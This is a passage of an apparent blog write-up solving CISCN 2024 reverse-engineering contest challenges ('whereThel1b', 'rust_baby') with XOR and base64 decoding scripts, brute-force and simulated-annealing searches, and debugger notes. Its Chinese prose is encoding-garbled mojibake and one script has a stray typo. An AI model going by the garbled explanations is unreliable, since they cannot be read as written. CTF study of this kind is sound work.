class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,t);<br>            <span class="hljs-type">char</span> tmp=ptr[k];<br>            ptr[k]=ptr[t];<br>            ptr[t]=tmp;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)&#123;<br>            v28[ptr[i]]=v31[i];<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)&#123;<br>            v28[i]=v28[i]^rand1[i];<br>        &#125;<br>        <span class="hljs-comment">//for(int i=0;i&lt;38;i++)&#123;</span><br>        <span class="hljs-comment">// printf(&quot;%c&quot;,v28[i]&amp;0x7f);</span><br>        <span class="hljs-comment">//&#125;</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,v28);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="whereThel1b-1"><a href="#whereThel1b-1" class="headerlink" title="whereThel1b-1"></a>whereThel1b-1</h2><h3 id="æ³•1-1"><a href="#æ³•1-1" class="headerlink" title="æ³•1"></a>æ³•1</h3><p>Cpythoné¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™ä¸€ç›´æƒ³ç€æ˜¯importçš„é—®é¢˜ï¼Œåé¢è¦ç”¨kaliå·²ç»æ¥ä¸åŠäº†</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716993462661-7b1c4bce-d467-4f62-a8d4-02601a8562ea.png" class="" title="img"><p>æ‰¾base64çš„æ—¶å€™èƒ½æ‰¾åˆ°Pyx_CreateStringTabAndInitStringsï¼Œæœ‰baseå’Œrandom</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716993606395-1b5b4e76-c515-4c82-813b-3514d1af09a2.png" class="" title="img"><p>__pyx_n_s_plaé€šå¸¸ç”¨äºå­˜å‚¨å­—ç¬¦ä¸²å¸¸é‡</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716993668366-4b9962c6-df36-4de7-9fee-81ab7ad3a5ba.png" class="" title="img"><p>å‚æ•°0å¼•ç”¨è¿‡å»ï¼Œåœ¨åŒä¸€ä¸ªå‡½æ•°ä¸‹æ‰¾</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719236164812-6e1d837b-f1a4-4fbd-9dd9-9361f1c01721.png" class="" title="img"><p>æ‰¾åˆ°random</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719236214431-a89bec30-88ce-4f11-a9c9-1c899aecf9c2.png" class="" title="img"><p>çŒœæµ‹seedä¸º0</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719236120702-95b1b2b7-76cc-4c37-ab95-4cdd31002362.png" class="" title="img"><p>åŒæ ·çš„æ–¹æ³•æ‰¾åˆ°base64</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719236330901-4d5573cf-9236-4c72-ae56-8a8a5d31a1d6.png" class="" title="img"><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719236440941-838ce061-c611-4460-a302-9949cc07ec25.png" class="" title="img"><p>æ„Ÿè§‰éšæœºæ•°æœ€å¤§56åº”è¯¥æ˜¯çŒœçš„ï¼Œå› ä¸ºåˆšå¥½56ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br>random.seed(<span class="hljs-number">0</span>)<br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):<br>    temp = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">56</span>)<br>    encry[i] ^= temp<br>    <span class="hljs-comment">#print(chr(encry[i]),end=&#x27;&#x27;)</span><br><span class="hljs-built_in">print</span>(base64.b64decode(<span class="hljs-string">&#x27;ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9&#x27;</span>.encode()))<br><span class="hljs-comment"># flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;</span><br></code></pre></td></tr></table></figure><h3 id="æ³•2-1"><a href="#æ³•2-1" class="headerlink" title="æ³•2"></a>æ³•2</h3><p>è¿˜æœ‰ç›´æ¥çˆ†ç ´çš„ï¼Œpythonè¦ä¸º3.10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> whereThel1b<br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>,<br>         <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>,<br>         <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>                abc = <span class="hljs-built_in">chr</span>(a) + <span class="hljs-built_in">chr</span>(b) + <span class="hljs-built_in">chr</span>(c)<br>                flag_test = (flag + abc).ljust(<span class="hljs-number">42</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>                result = whereThel1b.trytry(flag_test.encode())<br>                position = i * <span class="hljs-number">4</span><br>                ret_substring = result[position:position + <span class="hljs-number">4</span>]<br>                encry_substring = encry[position:position + <span class="hljs-number">4</span>]<br>                <span class="hljs-keyword">if</span> ret_substring == encry_substring:<br>                    flag += abc<br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;</span><br></code></pre></td></tr></table></figure><h3 id="æ³•3-1"><a href="#æ³•3-1" class="headerlink" title="æ³•3"></a>æ³•3</h3><p>é»‘ç›’æµ‹è¯•ï¼ŒçŒœæµ‹ä¸base64æœ‰å…³</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719210883065-a2343c43-a959-414e-b8c5-b5c9fca9397b.png" class="" title="img"><p>è¾“å…¥42ä¸ªaï¼Œå¾—åˆ°retä¸base64åçš„ç»“æœ</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719210950827-d1bd4991-5350-436f-bc76-fccd2028268b.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br>a = [<span class="hljs-number">111</span>, <span class="hljs-number">79</span>, <span class="hljs-number">118</span>, <span class="hljs-number">80</span>, <span class="hljs-number">67</span>, <span class="hljs-number">85</span>, <span class="hljs-number">86</span>, <span class="hljs-number">72</span>, <span class="hljs-number">70</span>, <span class="hljs-number">78</span>, <span class="hljs-number">116</span>, <span class="hljs-number">93</span>, <span class="hljs-number">74</span>, <span class="hljs-number">73</span>, <span class="hljs-number">80</span>, <span class="hljs-number">77</span>, <span class="hljs-number">84</span>, <span class="hljs-number">119</span>, <span class="hljs-number">78</span>, <span class="hljs-number">122</span>, <span class="hljs-number">81</span>, <span class="hljs-number">103</span>, <span class="hljs-number">64</span>, <span class="hljs-number">79</span>, <span class="hljs-number">106</span>, <span class="hljs-number">71</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">106</span>, <span class="hljs-number">113</span>, <span class="hljs-number">79</span>, <span class="hljs-number">123</span>, <span class="hljs-number">95</span>, <span class="hljs-number">121</span>, <span class="hljs-number">66</span>, <span class="hljs-number">94</span>, <span class="hljs-number">114</span>, <span class="hljs-number">66</span>, <span class="hljs-number">88</span>, <span class="hljs-number">75</span>, <span class="hljs-number">95</span>, <span class="hljs-number">65</span>, <span class="hljs-number">93</span>, <span class="hljs-number">124</span>, <span class="hljs-number">126</span>, <span class="hljs-number">127</span>, <span class="hljs-number">75</span>, <span class="hljs-number">75</span>, <span class="hljs-number">71</span>, <span class="hljs-number">75</span>, <span class="hljs-number">113</span>, <span class="hljs-number">73</span>, <span class="hljs-number">73</span>, <span class="hljs-number">84</span>, <span class="hljs-number">117</span>, <span class="hljs-number">75</span>]<br>b = [<span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">104</span>, <span class="hljs-number">10</span>]<br><br>ret = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encry)):<br>    ret += [a[i] ^ b[i] ^ encry[i]]<br><br><span class="hljs-built_in">print</span>(ret)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ret:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)a<br></code></pre></td></tr></table></figure><p>å‘ç°è¾“å‡ºæœ‰æ˜æ˜¾çš„Zmxhï¼Œä¸ºflagçš„base64ç¼–ç ï¼Œè§£å¯†å¾—åˆ°flag</p><h3 id="æ³•4"><a href="#æ³•4" class="headerlink" title="æ³•4"></a>æ³•4</h3><p>å­—ç¬¦ä¹‹é—´ç›¸äº’ä¸å½±å“ï¼Œé’ˆå¯¹è°ƒç”¨åº“çš„å­å‡½æ•°ï¼Œè€ƒè™‘ç”¨æ¨¡æ‹Ÿé€€ç«ç®—æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">import</span> whereThel1b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shared</span>(<span class="hljs-params">lhs, rhs</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([ x == y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(lhs, rhs) ])<br><br><br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br>flag = [ <span class="hljs-number">0</span> ] * <span class="hljs-number">42</span><br>ALPHABET = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~&#x27;</span><br><br>t = <span class="hljs-number">0.7</span><br>i = <span class="hljs-number">0</span><br>flag_val = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t *= <span class="hljs-number">0.99998</span><br>    i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">511</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag), flag_val, t)<br><br>    current = flag[:]<br>    j = random.randrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(current))<br>    current[j] = <span class="hljs-built_in">ord</span>(random.choice(ALPHABET))<br><br>    seed = random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>)<br>    current_val = shared(whereThel1b.trytry(<span class="hljs-built_in">bytes</span>(current)), encry)<br>    random.seed(seed)<br><br>    delta = current_val - flag_val<br>    <span class="hljs-keyword">if</span> math.exp(delta / t) &gt; random.random():<br>        flag_val = current_val<br>        flag = current<br></code></pre></td></tr></table></figure><h2 id="rust-baby-1"><a href="#rust-baby-1" class="headerlink" title="rust_baby-1"></a>rust_baby-1</h2><h3 id="æ³•1-2"><a href="#æ³•1-2" class="headerlink" title="æ³•1"></a>æ³•1</h3><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716020582762-95b68c0a-c035-4bff-823f-6b6aeaa426da.png" class="" title="img"><p>æœ‰ä¸€äº›å­—ç¬¦ä¸²å»è§£å¯†</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716122521848-51c1d8e4-4ba0-447e-b78b-3e916044ff26.png" class="" title="img"><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716122605446-778ac946-0a69-49a5-b0b0-7d8dbb08b8b3.png" class="" title="img"><p>äº¤å‰å¼•ç”¨ä¸Šè¿°å­—ç¬¦ä¸²æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œå¾€ä¸‹ç¿»</p><p>è°ƒè¯•å‘ç°æ•°æ®åœ¨v21ï¼Œä¸è¶³8ä¸ºä½ç”¨Eå¡«å……ï¼Œ8C3å‡½æ•°æ²¡é€†ï¼Œç»è¿‡å°è¯•å‘ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span>~<span class="hljs-number">1</span>  -<span class="hljs-number">1</span><br><span class="hljs-number">2</span>~<span class="hljs-number">3</span>  +<span class="hljs-number">0</span><br><span class="hljs-number">4</span>~<span class="hljs-number">5</span>  +<span class="hljs-number">1</span><br><span class="hljs-number">6</span>~<span class="hljs-number">7</span>  +<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ä¹‹å^0x33ï¼Œæ€»å…±104ä¸ªå­—èŠ‚</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719283844157-b1f2e735-c111-4901-946b-8654e32d870a.png" class="" title="img"><p>ä¸‹å†…å­˜æ–­ç‚¹ï¼Œæ‰¾åˆ°ä¸‹ä¸€æ¬¡ç”¨è¯¥å†…å­˜çš„åœ°æ–¹</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719286437388-c55b4b78-133d-4bb6-8f6a-0a1f39a43946.png" class="" title="img"><p>ç›´æ¥åˆ°ä¸‹ä¸€æ®µå¤„ç†çš„åœ°æ–¹ï¼Œv96è²Œä¼¼æ˜¯å®šå€¼</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719286453823-fa35f6d5-9c90-4b98-a186-94977790ab2c.png" class="" title="img"><p>åé¢çš„0xABæ˜¯å¡«å……ä½</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719287232019-40b05bbf-2297-448d-8649-5e582a648b6d.png" class="" title="img"><p>æ ¹æ®ä¸Šé¢104å­—èŠ‚ï¼Œå¼‚æˆ–çš„å¯†é’¥ä¹Ÿè¦104å­—èŠ‚ï¼Œä½†æ˜¯è¿™é‡Œåªæœ‰8å­—èŠ‚ï¼Œç”¨0å»å¼‚æˆ–ä»»ä½•å€¼éƒ½ä¸å½±å“ç»“æœ</p><p>åœ¨xoré‚£é‡Œä¸‹æ–­ç‚¹ï¼Œç„¶åæŠŠè¾“å…¥çš„å…¨æ”¹ä¸º0</p><p>å†å–æ¶ˆæ–­ç‚¹ï¼Œè¿è¡Œåˆ°cmpå¤„ï¼Œæå–å¯†é’¥</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719295313539-f95f9c42-d2c2-48eb-affa-7fac782c26e7.png" class="" title="img"><p>è¿™æ˜¯base64ï¼Œç‹ äºº</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719283353894-a06460e1-f4bc-403c-b0fc-be145cad8c1d.png" class="" title="img"><p>ä¸Šé¢æœ‰æ®µè§£å¯†ä¸äº†çš„base64å°±æ˜¯å¯†æ–‡</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719287355376-6737a252-ea7e-4a0c-9fb3-2543e63867cc.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded_string = <span class="hljs-string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span><br>xor_key = <span class="hljs-string">&quot;3F8gIsJ5GVY12otH0xn8VRTN0ntYWQlC3iy0SNnyG6lA4ab7/zjB1eLod3hvIgTmFj4MNVJc/cHlWRzQrlqy3Rn4QuYsiVnlEZzIe4Fwf2+8bwKP9/TIcK4C+FvicggJb79LObXQHqM=&quot;</span><br><br><span class="hljs-comment"># æ­¥éª¤1: base64è§£ç </span><br>decoded_bytes = base64.b64decode(encoded_string)<br>decoded_keys = base64.b64decode(xor_key)<br><br>xor_bytes = []<br><span class="hljs-comment"># æ­¥éª¤2: å¼‚æˆ–å¯†é’¥</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decoded_bytes)):<br>    xor = decoded_bytes[i] ^ decoded_keys[i]<br>    xor_bytes.append(xor)<br><br><span class="hljs-comment"># æ­¥éª¤3: å¼‚æˆ–0x33</span><br>xor_0x33_bytes = <span class="hljs-built_in">bytes</span>([b ^ <span class="hljs-number">0x33</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> xor_bytes])<br><br><span class="hljs-comment"># 8ä¸ªå­—ç¬¦ä¸€ç»„è¿›è¡ŒåŠ å‡è¿ç®—</span><br>processed_bytes = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor_0x33_bytes), <span class="hljs-number">8</span>):<br>    group = <span class="hljs-built_in">list</span>(xor_0x33_bytes[i:i+<span class="hljs-number">8</span>])<br>    <span class="hljs-keyword">for</span> j <span 